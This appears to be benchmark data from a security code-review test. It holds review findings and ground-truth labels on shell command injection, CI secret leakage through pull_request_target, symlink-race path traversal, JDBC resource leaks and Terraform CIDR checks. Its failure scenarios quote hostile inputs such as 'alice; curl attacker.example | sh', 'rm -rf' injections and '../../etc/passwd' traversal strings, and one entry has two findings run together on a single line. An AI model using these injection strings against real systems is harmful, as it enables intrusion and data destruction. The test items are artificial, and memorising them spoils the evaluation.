findings.body: Taking PurePath(user_id).name remaps any slash-separated (and, on Windows, backslash-separated) value to its final segment before the lookup. Inputs that previously could not match a row, such as ../../admin or tenant/other-user, now query admin / other-user. pathlib is also OS-dependent, so the same ID normalizes differently on Windows vs POSIX. The query is still parameterized, so this is not injection — it is an identity-mapping change. Validate user_id against the real ID format (digits, UUID, etc.) and bind that value; do not use pathlib to sanitize identifiers.

findings.body: `user` is interpolated into a string and executed by `sh -c`. Metacharacters such as `;`, `|`, `$()`, and backticks are interpreted by the shell, so this is classic OS command injection. The previous `Command::new("report").args(["--user", user])` form already passed the value as a single argv and did not invoke a shell. Restore that argv style (or equivalent `Command` args without `sh -c`) so `user` cannot change the command that runs.
findings.failure_scenario: A caller passes a crafted user such as `alice; curl attacker.example | sh` (or `$(...)` / backticks). `sh -c` executes the injected command with the process privileges, giving arbitrary remote code execution.
findings.title: OS command injection: pass user as a separate argv

findings.body: `skip(1)` discards the first element on every call. The previous implementation returned `rows` unchanged, and the commit claims to preserve report rows for named users. Callers now lose the leading row; a single-row input becomes an empty report.
findings.failure_scenario: When render_report is called with ["first", "second"], it returns ["second"] instead of both rows, silently dropping the first report row.
findings.title: Return all rows instead of dropping the first

findings.body: `render_report` now drops the first row via `skip(1)`, but this test only checks that something remains. Both the old preserve-all behavior and the new drop-first behavior satisfy `!is_empty()` for a two-element input, so a regression of the skip would ship unnoticed.
findings.title: Assert skipped first row, not merely non-empty

findings.body: The spec requires report commands to pass user names as arguments without a shell. Interpolating `user` into a string and running it with `sh -c` does the opposite, and any metacharacters in `user` are interpreted by the shell. Restore `Command::new("report").args(["--user", user])` and drop the `format!`/`sh -c` wrapper.
findings.failure_scenario: A crafted user value such as `alice; rm -rf /tmp/x` is interpolated into the `sh -c` string, so the shell executes the injected command instead of only invoking report.
findings.title: Pass the user as a Command argument, not via a shell

findings.body: prepareStatement() allocates a server-side cursor that is never closed. JDBC does not close the Statement when the ResultSet is closed by the caller, and this method does not expose the Statement, so pooled connections will accumulate open statements until the connection is discarded. Returning ResultSet also ties callers to an open cursor; map the rows before closing both resources (try-with-resources on the statement) and return a collection or domain object instead.
findings.failure_scenario: Repeated find() calls on a pooled Connection leave PreparedStatements open; the pool or database hits max-cursors/max-statements and subsequent queries fail or block.
findings.title: Do not return a ResultSet from an unclosed PreparedStatement

findings.body: userId is used as userId.trim().toLowerCase() with no null check. In Java a String parameter may be null, and String.trim() will throw NullPointerException before the query runs.
findings.failure_scenario: A caller invokes find(db, null); trim() throws NullPointerException and no query is executed.
findings.title: Guard null userId before calling trim()

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: prepareStatement allocates a JDBC Statement that this method never closes. Returning the ResultSet prevents try-with-resources here (closing the statement would close the ResultSet), so the handle leaks unless a caller that is not shown closes the statement via getStatement(). Repeated calls accumulate open cursors on the connection.
findings.failure_scenario: Each find() leaves a PreparedStatement open; under load the connection hits the driver/database open-cursor limit and subsequent queries fail.
findings.title: PreparedStatement is never closed

findings.body: Switching the trigger to pull_request_target runs this workflow in the base-repository context, so repository secrets and GITHUB_TOKEN are available. The job then checks out the PR head and runs npm test, which executes attacker-controlled package.json scripts, tests, and install hooks. Restore pull_request (no secrets on fork PRs) or keep pull_request_target only if you never check out or execute PR code.
findings.failure_scenario: An attacker opens a fork PR that rewrites the npm test script to exfiltrate env vars; pull_request_target runs that head SHA with RELEASE_TOKEN and GITHUB_TOKEN present, leaking the tokens.
findings.title: Do not use pull_request_target with untrusted checkout

findings.body: ref: github.event.pull_request.head.sha replaces the trusted default (base branch) with the contributor's tree. actions/checkout also persists GITHUB_TOKEN into .git by default, so the following npm test step runs untrusted code with credentials. On pull_request_target, omit this ref (or pin to the base SHA) and never execute PR-provided scripts.
findings.failure_scenario: A malicious PR adds a postinstall or test hook; checkout of head.sha materializes that tree and npm test executes it inside the privileged pull_request_target job.
findings.title: Stop checking out the PR head on pull_request_target

findings.body: RELEASE_TOKEN is injected into the same step that runs npm test after checking out the PR head. Any script in that tree can read process.env.RELEASE_TOKEN and send it off-box. Drop this env (or only set it in a later job that uses a trusted, base-ref checkout and does not execute PR code).
findings.failure_scenario: A PR changes a test or package.json script to POST process.env.RELEASE_TOKEN to an attacker server; the workflow exports the secret into that process and the token is stolen.
findings.title: Do not pass RELEASE_TOKEN into untrusted npm test

expected.label: pull_request_target executes untrusted head with a secret

findings.body: `user` is interpolated into a string and executed via `sh -c`, so shell metacharacters in the username become part of the command line. The previous `Command::new("report").args(["--user", user])` form passed the value as a single argv element and was not interpreted by a shell. Restore that argv-based spawn (and drop the `format!` + `sh -c` path) so `user` cannot break out of the argument.

findings.title: OS command injection: do not interpolate user into sh -c

findings.body: The production path now drops the first row via skip(1), but this test only checks that the result is non-empty. Two leftover rows still satisfy that, so a regression that stops skipping (or skips the wrong rows) would pass.
findings.title: Assert skipped header row, not just non-empty output

findings.body: The spec requires report commands to pass user names as arguments without a shell. `Command::new("sh").args(["-c", ...])` plus interpolating `{user}` into the command string does the opposite and lets shell metacharacters in the user name run arbitrary commands. Drop the `format!` line and invoke `report` with argv as before.
findings.failure_scenario: A user name containing `; rm -rf /` or other shell metacharacters is interpolated into `sh -c`, so the shell executes the injected command instead of only running `report --user`.
findings.title: Pass the user as a Command argument, not via a shell

findings.body: The jail check canonicalizes `candidate` and tests `strip_prefix`, then opens that path by name. The validation is not bound to the open, so a writable directory lets an attacker swap a just-checked entry (or a parent) for a symlink after the check and before `File::open`, which will follow it out of `root`. Walk components with `openat` and `O_NOFOLLOW` (or equivalent), or open first without following the final symlink and verify the opened handle.
findings.failure_scenario: An attacker creates a regular file under root so canonicalize and strip_prefix succeed, then replaces it with a symlink to /etc/passwd; File::open follows the symlink and returns the secret file.
findings.title: Close the canonicalize-then-open TOCTOU path traversal

findings.body: canonicalize is run on root.join(name) before any confinement test. When name is absolute or contains ParentDir, that call resolves and stats paths outside root. A missing outside target returns NotFound and never reaches strip_prefix; an existing one becomes PermissionDenied. That error split is an existence oracle on the host filesystem. Lexically reject absolute names and .. components first, and treat every failure on an escaping name as PermissionDenied.
findings.failure_scenario: An attacker sets name to ../../etc/passwd versus ../../etc/no-such-file. The first path canonicalizes and then yields PermissionDenied; the second fails inside canonicalize with NotFound, revealing that /etc/passwd exists.
findings.title: Reject escaping names before canonicalize

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.

findings.body: Date.toGMTString() has been deprecated since JDK 1.1. Compilers emit deprecation warnings (or fail under -Werror), and the method is a leftover from the pre-DateFormat date API. Format an Instant (or OffsetDateTime) in UTC instead, e.g. DateTimeFormatter.RFC_1123_DATE_TIME with ZoneOffset.UTC; add `import java.time.Instant;` / `import java.time.format.DateTimeFormatter;` / `import java.time.ZoneOffset;` and drop the java.util.Date import.
findings.failure_scenario: Builds that treat deprecation as an error fail on this line; on a future JDK that removes the method the class no longer compiles, and callers keep receiving a legacy GMT string from an unmaintained API.
findings.title: Replace Date.toGMTString() with java.time

findings.body: `pull_request_target` runs this workflow in the base-repository context, so repository secrets are available to the job. Combined with checking out the PR head SHA and running `npm test`, any fork PR can execute untrusted code with those secrets. This workflow only needs `contents: read` and is meant to test the PR; `pull_request` is the correct event and does not grant base-repo secrets to fork PRs.
findings.failure_scenario: An attacker opens a pull request that adds a malicious test or postinstall script; the workflow checks out that commit and runs `npm test` with base-repo privileges, so the script can read RELEASE_TOKEN and exfiltrate it.
findings.title: Revert the trigger to pull_request

findings.body: Forcing checkout to `github.event.pull_request.head.sha` under `pull_request_target` replaces the trusted default (the base branch) with attacker-controlled code. The next step then executes that tree via `npm test`. If the trigger must stay `pull_request_target`, drop this `ref` override and never run scripts from the PR; if the goal is to test the PR, keep `on: pull_request` instead.
findings.failure_scenario: A fork PR points HEAD at a commit whose package.json scripts steal env vars; checkout uses that SHA and `npm test` runs the payload in the privileged job.
findings.title: Do not check out untrusted PR HEAD here

findings.body: `RELEASE_TOKEN` is now in the environment of `npm test` after the job has checked out the pull request HEAD. Any script the PR defines (tests, lifecycle hooks, or a replaced binary) can read the secret. Remove this env mapping; a review/test job that executes contributor code must not receive write-capable release credentials.
findings.failure_scenario: A malicious or compromised PR runs `npm test` (or an npm lifecycle script) that prints or POSTs `process.env.RELEASE_TOKEN`, leaking the release credential from the base repository.
findings.title: Stop injecting RELEASE_TOKEN into PR tests

findings.body: The new guard only string-compares against "0.0.0.0/0". Equivalent or near-equivalent ranges (0.0.0.0/1, 0.0.0.0/8, 128.0.0.0/1, and any other public prefix) still apply to the SSH ingress rule, so the stated "Admin access cannot be public" control is trivial to bypass via -var or a tfvars file. Require a valid CIDR, a sufficiently specific prefix, and reject ranges that contain 0.0.0.0; if admin access is meant to stay private, also require the whole block to sit inside RFC1918.
findings.failure_scenario: An operator or compromised pipeline sets -var='admin_cidr=0.0.0.0/1' (or another public supernet). Terraform accepts it because it is not the exact string 0.0.0.0/0, and port 22 is opened to roughly half the internet.
findings.title: IaC misconfiguration: reject all world-open admin CIDRs

findings.body: admin_cidr is a new module input with a non-obvious constraint (public CIDRs are rejected). Without a description, callers only see the type and default and will not know the intended use or the validation rule until apply fails.
findings.suggestion:
variable "admin_cidr" {
  description = "CIDR block allowed for SSH admin access. Must not be 0.0.0.0/0."
findings.title: Add a description to the public admin_cidr variable

ground_truth.clean_trap: The ingress CIDR became configurable, but its safe default and validation explicitly reject public admin access.

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: toGMTString() is deprecated and emits an RFC 7231 string (e.g. "Mon, 15 Jan 2024 12:00:00 GMT") instead of the previous ISO-8601 value from toISOString(). Combined with wrapping the payload in a tuple and dropping timeoutMs from the object, this changes both the date format and the return shape that callers already depend on.
findings.failure_scenario: Consumers that Date.parse or schema-validate fetchedAt as ISO-8601, or that read timeoutMs / fetchedAt on the returned object, get an unparseable GMT string or undefined fields after this change.
findings.suggestion: return { id, timeoutMs, fetchedAt: new Date().toISOString() };
findings.title: Keep ISO-8601 fetchedAt and the original record shape

findings.body: user is interpolated into a shell string and executed with sh -c. The previous Command::new("report").args(["--user", user]) form passed the value as a single argv element and was not subject to shell metacharacter interpretation. A username containing ;, |, &&, $(...), backticks, or quotes will run arbitrary commands as the process user. Restore argv-based invocation (Command::new("report").args(["--user", user])) and do not build the command via format!/sh -c.

findings.body: The spec requires report commands to pass user names as arguments without a shell. findings.body: The containment check uses a path string, then a second lookup opens that path. After canonicalize/strip_prefix succeed, replacing the final component (or an intermediate directory) with a symlink to a file outside root makes File::open follow the new link. Pre-planted symlinks are blocked; a raced swap is not. Open with O_NOFOLLOW (or an openat walk) after rejecting non-Normal components in name, or re-validate the path of the already-open fd (e.g. /proc/self/fd/N) before reading.
findings.failure_scenario: An attacker with write access to the reports tree keeps a regular file at name until canonicalize succeeds, then swaps it (or a parent dir) for a symlink to /etc/passwd; File::open follows the symlink and the caller reads a file outside root.
findings.title: Close canonicalize-to-open TOCTOU (path traversal)

findings.body: `canonicalize` runs on `root.join(name)` before the `strip_prefix` jail check, so a `name` such as `../../../etc/passwd` is resolved on the real filesystem. Missing outside paths surface as `NotFound` from `canonicalize`; existing ones become `Ok` and then `PermissionDenied` from `strip_prefix`. A caller who controls `name` can therefore probe which paths exist outside `root`. Reject absolute names and `ParentDir` components first, and only canonicalize paths that are already lexically under `root` (keep `strip_prefix` to catch escaping symlinks).
findings.failure_scenario: An attacker supplies name `../../../etc/passwd` versus `../../../etc/does-not-exist`: the first yields PermissionDenied after a successful canonicalize, the second yields NotFound, revealing whether the outside path exists.
findings.title: Reject escaping names before canonicalize

findings.body: The PreparedStatement is never closed. Returning a live ResultSet keeps the statement (and its DB cursor) open, and callers that only close the ResultSet will not release it unless they also call resultSet.getStatement().close(). Repeated lookups will exhaust connection-pool cursors. Map the row(s) inside this method and wrap the statement in try-with-resources instead of leaking JDBC resources across the API boundary.
findings.failure_scenario: Each find() call leaves a server-side cursor open; under load the pool hits max open statements/cursors and subsequent queries fail with a cursor or connection-limit error.
findings.title: Close the PreparedStatement after mapping results

findings.body: userId was previously unused, so callers could pass null without effect. It is now dereferenced via trim() with no guard, so a null argument throws NullPointerException instead of querying or failing with a clear argument error.
findings.failure_scenario: A caller that still passes null userId (valid before this change) hits NPE on trim() and never executes the query.
findings.title: Null-check userId before trim()

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: prepareStatement allocates a Statement that this method neither closes nor returns. The ResultSet stays valid only while that Statement lives, and the caller has no handle to close it. If executeQuery throws, the Statement is leaked immediately; on success it is left to GC, which can close the cursor while the caller is still reading.
findings.failure_scenario: After find() returns, the caller iterates the ResultSet while the unreferenced Statement is finalized or the pool reclaims it, causing the iteration to fail or leaving statements open until the pool is exhausted.
findings.title: PreparedStatement is never closed

ground_truth.clean_trap: User-controlled text reaches a SQL operation only through PreparedStatement.setString, so it cannot alter query syntax.

findings.body: pull_request_target executes this workflow in the base repository context, so secrets are available. Combined with checking out github.event.pull_request.head.sha and running npm test, a fork PR can run arbitrary scripts (package.json, test files) with those secrets. Keep pull_request, or never check out or execute PR head code in this job.
findings.failure_scenario: An attacker opens a pull request that changes package.json test scripts or test files; the workflow checks out that commit and runs npm test with base-repo privileges, leaking RELEASE_TOKEN or running attacker-controlled code.
findings.title: Do not run untrusted PR code under pull_request_target

findings.body: github.event.pull_request.head.sha is attacker-controlled. Checking it out in a pull_request_target job replaces the trusted default (base-branch) tree with the PR author's code, so the following npm test step runs their scripts with repository secrets. Remove this ref override, or do not execute the checked-out tree in this job.
findings.failure_scenario: A malicious PR HEAD rewrites package.json test scripts to exfiltrate the environment; checkout of that SHA plus npm test runs the payload with access to RELEASE_TOKEN.
findings.title: CI misconfiguration: do not check out untrusted PR HEAD here

findings.body: RELEASE_TOKEN is injected into the environment of npm test after the job checks out the pull-request head. Any script the PR defines (test, pretest, or other npm lifecycle hooks) can read and exfiltrate this secret. Do not expose repository secrets to untrusted PR code; run privileged release steps only on trusted refs.
findings.failure_scenario: A contributor PR adds a pretest hook that curls $RELEASE_TOKEN to an attacker-controlled host; the job exports the secret and the token is stolen.
findings.title: Sensitive-data exposure: do not pass RELEASE_TOKEN to PR code

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The validation only rejects the exact string 0.0.0.0/0, so any other world-open or near-open prefix still applies to the SSH (22/tcp) ingress rule. Values such as 0.0.0.0/1, 0.0.0.0/8, or a padded 0.0.0.0/0 pass and expose admin SSH far beyond the previous hard-coded 10.20.0.0/16. Require a valid CIDR and a minimum prefix length (at least /16 to match the existing default); if admin access must stay private, also constrain the network to RFC1918.
findings.failure_scenario: An operator or CI -var/TF_VAR sets admin_cidr to 0.0.0.0/1 (or another broad public prefix); Terraform accepts it and AWS allows SSH from roughly half the internet.
findings.title: IaC misconfiguration: SSH CIDR check is trivially bypassed

findings.body: admin_cidr is a new module input with a default and a validation rule, but it has no description. Callers and generated module docs will not know it gates SSH ingress or that 0.0.0.0/0 is rejected.
findings.title: Add a description to the public admin_cidr variable

ground_truth.clean_trap: The ingress CIDR became configurable, but its safe default and validation explicitly reject public admin access.
ground_truth.name: terraform-clean-context-v1
